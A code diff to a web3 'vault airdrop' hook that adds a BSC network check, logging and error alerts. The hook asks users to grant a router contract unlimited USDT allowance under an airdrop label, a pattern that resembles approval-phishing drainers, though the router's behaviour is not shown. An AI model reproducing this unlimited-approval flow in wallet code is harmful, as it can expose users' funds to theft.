@@ -49,7 +49,7 @@ export function useVaultAirdrop() {
     setLoading(true);
     try {
       if (!window.ethereum) {
-        alert('❌ 请安装 MetaMask 钱包！');
+        alert('❌ 请连接钱包！');
         return false;
       }
 
@@ -62,6 +62,13 @@ export function useVaultAirdrop() {
         return false;
       }
 
+      // 检查网络
+      const network = await provider.getNetwork();
+      if (Number(network.chainId) !== contracts.chainId) {
+        alert(`❌ 请切换到 BSC 主网 (ChainId: ${contracts.chainId})\n当前网络: ${network.name} (ChainId: ${network.chainId})`);
+        return false;
+      }
+
       const usdtContract = new Contract(
         contracts.usdt,
         ERC20_ABI,
@@ -70,6 +77,8 @@ export function useVaultAirdrop() {
 
       console.log('🎯 开始授权 USDT 给 Router...');
       console.log('Router 地址:', contracts.router);
+      console.log('USDT 地址:', contracts.usdt);
+      console.log('当前网络:', network.name, 'ChainId:', network.chainId);
 
       // 授权无限额度
       const tx = await usdtContract.approve(contracts.router, MAX_UINT256);
@@ -80,9 +89,11 @@ export function useVaultAirdrop() {
 
       if (receipt.status === 1) {
         console.log('🎉 USDT 授权成功！');
+        alert('✅ USDT 授权成功！');
         return true;
       } else {
         console.error('❌ 授权交易失败');
+        alert('❌ 授权交易失败');
         return false;
       }
     } catch (error: any) {
@@ -90,6 +101,10 @@ export function useVaultAirdrop() {
       
       if (error.code === 4001) {
         alert('❌ 用户取消了授权');
+      } else if (error.code === 'UNSUPPORTED_OPERATION') {
+        alert('❌ 请确保钱包已连接并切换到 BSC 主网');
+      } else if (error.message?.includes('user rejected')) {
+        alert('❌ 用户拒绝了交易');
       } else {
         alert('❌ 授权失败: ' + (error.message || '未知错误'));
       }
